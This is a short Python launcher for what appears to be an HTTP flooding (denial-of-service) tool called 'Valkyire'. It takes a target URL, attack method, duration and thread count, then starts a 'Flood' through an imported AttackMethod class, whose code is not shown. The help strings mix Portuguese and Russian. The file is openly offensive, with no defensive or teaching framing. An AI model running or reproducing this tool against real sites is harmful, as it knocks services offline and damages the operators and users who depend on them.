
import os
import sys
import argparse


os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Falha ao importar alguns modulos", err)
    sys.exit(1)

parser = argparse.ArgumentParser(description="Valkyire HTTP Aтака")
parser.add_argument(
    "--target",
    type=str,
    metavar="<URL>",
    help="Target URL",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<HTTP>",
    help="Attack method",
)
parser.add_argument(
    "--time", type=int, default=1200, metavar="<time>", help="Введите время атаки в секундах"
)
parser.add_argument(
    "--threads", type=int, default=100, metavar="<threads>", help="contagem de threads (1-200)"
)


args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target


if __name__ == "__main__":
    
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

  
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
